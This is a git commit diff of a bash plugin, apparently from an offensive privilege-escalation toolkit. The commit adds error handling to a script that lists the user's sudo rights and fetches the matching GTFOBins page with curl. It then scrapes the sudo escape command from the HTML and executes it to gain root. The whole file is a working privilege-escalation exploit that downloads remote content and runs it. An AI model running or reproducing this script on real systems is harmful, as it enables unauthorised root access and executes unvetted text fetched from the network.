f3828c8cdc0b575f3f48263cc1e4630d08c4c4b6
Steels <87060751+Steels03@users.noreply.github.com>
2022-08-26 12:05:32 +0200

    Add pseudo error management

--- plugins/privesc/plugin_privesc_sudo.sh
+++ plugins/privesc/plugin_privesc_sudo.sh
@@ -1,11 +1,23 @@
+#!/bin/bash
 # [PLUGIN PRIVESC] Sudo rights exploitation
 
 res=$(sudo -l)
 bin=$(echo $res | rev | cut -d'/' -f 1 | rev)
 bin=${bin//$'\n'/}
-url="https://gtfobins.github.io/gtfobins/${bin}/#sudo"
-code=$(curl $url)
-cmd=$(echo $code | awk -F'<pre><code>sudo' '{print $2}')
-cmd=${cmd//$'\n'/}
-cmd=$(echo $cmd | awk -F'</code></pre>' '{print $1}')
-$cmd
+if [[ $bin == *' '* ]]
+then
+    exit 1
+else
+    url="https://gtfobins.github.io/gtfobins/${bin}/#sudo"
+    echo $url
+    code=$(curl $url)
+fi
+if [[ $code == *'<pre><code>sudo'* ]]
+then
+    cmd=$(echo $code | awk -F'<pre><code>sudo' '{print $2}')
+    cmd=${cmd//$'\n'/}
+    cmd=$(echo $cmd | awk -F'</code></pre>' '{print $1}')
+    $cmd
+else
+    exit 1
+fi
